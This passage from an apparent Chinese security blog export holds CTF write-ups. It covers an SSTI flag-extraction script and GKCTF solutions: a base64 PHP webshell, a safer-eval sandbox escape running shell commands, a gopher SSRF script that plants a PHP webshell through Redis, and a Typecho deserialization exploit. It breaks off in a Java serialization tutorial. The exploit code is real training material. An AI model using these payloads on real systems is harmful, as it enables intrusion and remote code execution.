class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters + string.digits+ <span class="string">&quot;-/_&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+j+<span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data =&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.get(url,params=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;~p0~&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            print(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h2 id="2-8过滤了空格，requests"><a href="#2-8过滤了空格，requests" class="headerlink" title="2.8过滤了空格，requests"></a>2.8过滤了空格，requests</h2><p>payload基本没有变动，在这种情况下还被恶心了一下request，所以我们应该这样用：</p>
<p>原本正常的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag</span><br></pre></td></tr></table></figure>

<p>改造后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\x20&#x2F;flag&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF</title>
    <url>/2020/10/27/GKCTF/</url>
    <content><![CDATA[<p>抽空把GKCTF的题目刷了，先从第一题开始说吧</p>
<h1 id="1-Check-in"><a href="#1-Check-in" class="headerlink" title="1.Check in"></a>1.Check in</h1><p>说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了</p>
<p>第一步访问就能审计到代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA==</span><br></pre></td></tr></table></figure>

<p>密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。</p>
<p>但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/mm0r1/exploits</span></span><br></pre></td></tr></table></figure>

<p>上传这里的gc漏洞，之后执行命令即可</p>
<h1 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h1><p>根据这篇文章可以做出来前半段成功拿到shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html</span><br></pre></td></tr></table></figure>

<p>这里我传入成功之后路径为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag</p>
<h1 id="3-EzNode"><a href="#3-EzNode" class="headerlink" title="3.EzNode"></a>3.EzNode</h1><p>就是一个很基础的代码审计：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000</p>
<p>而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(string, radix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">必需。要被解析的字符串。</td>
</tr>
<tr>
<td align="left">radix</td>
<td align="left">可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。</td>
</tr>
</tbody></table>
<p>这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试：</p>
<p><img src="..%5Cimages%5Cimage-20201027214654296.png" alt="image-20201027214654296"></p>
<p>发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>

<p>其中核心代码就是theFunction，我们传入进去污染参数即可执行代码</p>
<p><img src="image-20201028121332238.png" alt="image-20201028121332238"></p>
<h1 id="4-EzWeb"><a href="#4-EzWeb" class="headerlink" title="4.EzWeb"></a>4.EzWeb</h1><p>是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret</p>
<p><img src="image-20201028124819584.png" alt="image-20201028124819584"></p>
<p>查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容</p>
<p><img src="image-20201028125140003.png" alt="image-20201028125140003"></p>
<p>访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码：</p>
<p>file:[空格]/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化</p>
<p><img src="image-20201028132212757.png" alt="image-20201028132212757"></p>
<p>让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口</p>
<p>6379上得到：</p>
<p><img src="image-20201028132532651.png" alt="image-20201028132532651"></p>
<p>发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们改一下主机IP为:10.160.187.11</p>
<p>得到payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<h1 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h1><p>这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html</span><br></pre></td></tr></table></figure>

<p>exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况</p>
<p><img src="image-20201028171811386.png" alt="image-20201028171811386"></p>
<p>这个时候就必须看源码了</p>
<p>查找session，在源码中可以找到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">               <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no, you can\&#x27;t unserialize it without session QAQ&#x27;</span>);&#125;</span><br><span class="line">               $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">               Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">               $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">               $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">               Typecho_Db::set($db);</span><br><span class="line">               <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们去查找sesion在哪里赋值：</p>
<p><img src="image-20201028172113525.png" alt="image-20201028172113525"></p>
<p>结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">                        $type = explode(<span class="string">&#x27;_&#x27;</span>, $config[<span class="string">&#x27;adapter&#x27;</span>]);</span><br><span class="line">                        $type = array_pop($type);</span><br></pre></td></tr></table></figure>

<p>发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; $a,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>拿到flag：</p>
<p><img src="image-20201028172325171.png" alt="image-20201028172325171"></p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>​    题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>渗透</tag>
        <tag>nodejs</tag>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaSerialize</title>
    <url>/2020/11/02/JavaSerialize/</url>
    <content><![CDATA[<p>JAVA当中对于文件的处理都是通过IO流进行操作的</p>
<h1 id="一些IO流的API"><a href="#一些IO流的API" class="headerlink" title="一些IO流的API"></a>一些IO流的API</h1><ul>
<li>FileOutputStream  写入流，我们用该流可以写入内容到文件当中</li>
<li>FileInputStream   读取流</li>
<li>ObjectOutputStream 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化操作。</li>
<li>ObjectInputStream  反序列化并打印数据</li>
</ul>
<h1 id="JAVA反序列化过程"><a href="#JAVA反序列化过程" class="headerlink" title="JAVA反序列化过程"></a>JAVA反序列化过程</h1><p>首先我们要明白，Java的序列化与反序列化的过程是如何产生的，我们可以编写如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String obj = <span class="string">&quot;ls &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化对象写入文件aa.ser中</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// aa.ser中读取数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反序列化恢复对象obj,注意这里使用强转</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这串代码，我们将数据ls传入到了aa.ser当中，并且将其重新释放了出来。我们成功通过写入序列化文件并将其成功返回。</p>
<p>实现Serializable和Externalizable接口的类的对象才能被序列化。故我们写一个例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setAge(<span class="number">19</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;sakani&quot;</span>);</span><br><span class="line">      <span class="comment">//  person.setSex(true);</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//因为文件可能不存在，此时需要处理异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Person <span class="title">UnSerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        读取文件</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line"><span class="comment">//        到这一步来读取了文件流，下一步将其强转回对象</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"><span class="comment">//        readObject 是用来读取该流当中的对象</span></span><br><span class="line">        Person person2 =  (Person)objectInputStream.readObject();</span><br><span class="line">        System.out.println(person2.getAge());</span><br><span class="line">        <span class="keyword">return</span> person2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        SerializePerson();</span><br><span class="line"><span class="comment">//        这个方法用于序列化函数</span></span><br><span class="line">        Person person2 = UnSerializePerson();</span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;</span>,person2.getName(),person2.getAge()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 